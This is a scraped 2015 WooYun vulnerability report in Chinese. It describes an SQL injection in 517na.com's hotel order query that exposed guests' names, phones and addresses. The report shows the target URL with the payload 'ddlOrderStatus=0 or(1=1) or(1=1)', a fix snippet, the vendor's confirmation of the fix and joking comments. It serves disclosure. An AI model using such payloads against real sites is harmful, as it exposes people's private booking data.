{"id": 47542, "wybug_id": "wooyun-2015-093141", "wybug_title": "四川我要去哪517旅行网某处SQL注入导致数万酒店开房信息泄露（入住人姓名、手机、酒店地址、入住时间等）", "wybug_corp": "517na.com", "wybug_author": "Jim叔叔", "wybug_date": "2015-01-21 15:21", "wybug_open_date": "2015-01-22 08:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 今天你开房了吗？ 详细说明：  注入点存在于：酒店预订中心-》订单查询（http://jd.517na.com）在查询时会调用如下接口：http://jd.517na.com/HotelOrder/OrderQuery?txtOrderKeyId=&txtStartDate=2014-12-21&txtEndDate=2015-01-21&txtGuestName=&ddlOrderFlag=1&ddlOrderStatus=0&txtBuyerStatffId=其中ddlOrderStatus参数可以注入。注入payload：ddlOrderStatus=0 or(1=1) or(1=1)http://jd.517na.com/HotelOrder/OrderQuery?txtOrderKeyId=&txtStartDate=2013-10-01&txtEndDate=2015-01-21&txtGuestName=&ddlOrderFlag=1&ddlOrderStatus=0 or(1=1) or(1=1)&txtBuyerStatffId=从2013-10-01到2015-01-21国内酒店订单有1万多条：\n\n可以执行支付、查看详情、取消订单等操作！！！\n\n详情里面有入住人姓名、人数、手机、入住时间、酒店地址、邮寄地址等：\n\n   漏洞证明：  \n\n\n\n   修复方案：  try{\t//…...        int n=Convert.ToInt32(Request.QueryString[\"SelectStatus\"]);        //......    }catch(Exception ex){            Response.Write(\"送一个返程的机票可好。。。\");      }   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-22 08:53 厂商回复： 感谢Jim叔叔对517的关注 最新状态： 2015-01-22：已修复  ", "replys": "漏洞评价：\n评论\n     2015-01-21 15:23 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  卧槽。好险没开房@zeracker    \n     2015-01-21 15:41 |    \t\t帅气小狼狗 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 汪汪汪)\t\t \n  卧槽，我又遭了。    \n     2015-01-21 15:52 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  这不是机票平台吗，怎么有酒店订单？    \n     2015-01-21 15:55 |    \t\t1n. \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | ...)\t\t \n  你关注的白帽子 Jim叔叔 发表了漏洞 四川我要去哪517旅行网某处SQL注入导致数万酒店开房信息泄    \n     2015-01-21 16:00 |    \t\t苦咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:10        | 我就一菜逼，来看大牛装逼的)\t\t \n  是啊  这是机票平台的嘛    \n     2015-01-21 16:03 |    \t\tJim叔叔 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:25        | 这样子不太好吧。。)\t\t \n  @zeracker 他也可以定酒店的喔。。。我是在打广告吗？    \n     2015-02-07 01:19 |    \t\t安子 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 啪啪啪啪啪啪我是卖套的小行家)\t\t \n  ............    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}